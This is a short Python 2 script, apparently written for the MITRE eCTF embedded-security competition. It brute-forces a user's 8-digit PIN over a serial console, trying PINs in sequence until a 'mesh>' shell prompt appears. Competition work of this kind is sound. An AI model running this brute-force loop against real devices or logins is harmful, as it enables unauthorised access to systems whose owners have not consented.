from tqdm import tqdm
import sys
import serial
import argparse

parser = argparse.ArgumentParser(description='Brute force logins for the MITRE eCTF')
parser.add_argument('username', metavar='username', help='The username')
parser.add_argument('--start', type=int, default=0, help='The starting pin')

args = parser.parse_args()

starting_location = args.start
pin_range = 100000000
username = args.username
pin_length = 8
username_prompt = "Enter your username: "
pin_prompt = "Enter your PIN: "
mesh_prompt = "mesh> "

ser = serial.Serial("/dev/ttyUSB1", 115200)

# read data from the serial device ser until the first argument is detected
def recv_until(until, ser):
    recv = ser.read(len(until))
    while until not in recv:
	recv = recv + ser.read(1)
    return recv

# read data from the serial device ser until either the first or second argument is detected
def recv_until_either(until1, until2, ser):
    recv = ser.read(min(len(until1), len(until2)))
    while until1 not in recv and until2 not in recv:
        recv = recv + ser.read(1)
    return recv

print "We have reached the initial starting point."
print "If you are hanging here you might want to restart the board"
recv_until(username_prompt, ser)
print "Starting to brute force logins!"
for i in tqdm(range(starting_location, pin_range)):
    pin = max(pin_length - len(str(i)), 0)*"0" + str(i)
    ser.write(username + "\n")
    ser.write(pin + "\n")
    prompt = recv_until_either(username_prompt, mesh_prompt, ser)
    if mesh_prompt in prompt:
        print("")
	print("Successful login!")
	print("Username: {0}".format(username))
	print("PIN: {0}".format(pin))
        break

